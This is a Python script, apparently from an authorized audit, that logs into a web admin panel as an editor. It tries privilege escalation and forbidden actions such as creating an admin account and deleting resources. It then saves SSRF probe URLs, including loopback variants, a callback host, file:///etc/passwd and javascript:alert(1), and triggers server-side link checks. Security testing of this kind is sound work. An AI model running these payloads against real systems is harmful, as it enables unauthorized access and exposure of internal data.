import probe as p,requests,pickle,os,json,re
from bs4 import BeautifulSoup
s=requests.Session();p.req('editor-login','/api/login/','POST',s,data={'username':'audit-editor','password':(p.ROOT/'editor.private').read_text()},headers={'Origin':p.BASE})
f=p.ROOT/'editor-cookies.private';f.write_bytes(pickle.dumps(s.cookies));os.chmod(f,0o600)
r=p.req('editor-dashboard','/admin/',session=s);csrf=p.data(r)['csrf']
for n,path in enumerate(['/admin/users/','/admin/settings/','/admin/import/','/admin/audit/','/admin/metrics/','/admin/trash/','/admin/categories/','/api/export/']):p.req('editor-admin-page-'+str(n),path,session=s)
for n,d in enumerate([{'action':'create-user','username':'editor-escalation','password':'Audit-No-Real-Account-123!','role':'admin'}, {'action':'update-user','id':'2','role':'admin','active':'true'}, {'action':'publish','id':'blender','version':'1'}, {'action':'unpublish','id':'blender','version':'1'}, {'action':'delete-resource','id':'blender','version':'1'}, {'action':'save-settings','featuredResourceId':'gimp'}, {'action':'import-apply','payload':'{}'}, {'action':'delete-category','id':'writing'}]):
 d['csrf']=csrf;p.req('editor-forbidden-action-'+str(n),'/api/manage/','POST',s,data=d,headers={'Origin':p.BASE})
r=p.req('template-resource','/admin/resources/blender/',session=s);d=p.data(r, '/api/manage/'); template=json.loads(d['resource'])
(p.ROOT/'resource-template.json').write_text(json.dumps(template,ensure_ascii=False))
for n,url in enumerate(['http://sanjiang-audit-callback:9000/probe-editor','http://127.0.0.1:4321/api/health/','http://[::1]:4321/api/health/','http://2130706433:4321/api/health/','http://sanjiang-audit-callback:9000/redirect','file:///etc/passwd','javascript:alert(1)']):
 obj=dict(template);obj.update(id='audit-ssrf-'+str(n),title='Audit SSRF '+str(n),url=url,sourceUrl=url)
 r=p.req('ssrf-save-'+str(n),'/api/manage/','POST',s,data={'csrf':csrf,'action':'save-resource','version':'','resource':json.dumps(obj,ensure_ascii=False)},headers={'Origin':p.BASE})
 if r.status_code==303:
  p.req('ssrf-check-'+str(n),'/api/manage/','POST',s,data={'csrf':csrf,'action':'check-link','id':obj['id']},headers={'Origin':p.BASE})
  r=p.req('ssrf-result-'+str(n),'/admin/resources/'+obj['id']+'/',session=s)
  text=BeautifulSoup(r.text,'html.parser').get_text(' ',strip=True)
  print('SSRF RESULT',n,text[-1800:])
 else:print('SSRF SAVE REJECTION',r.text[:600])
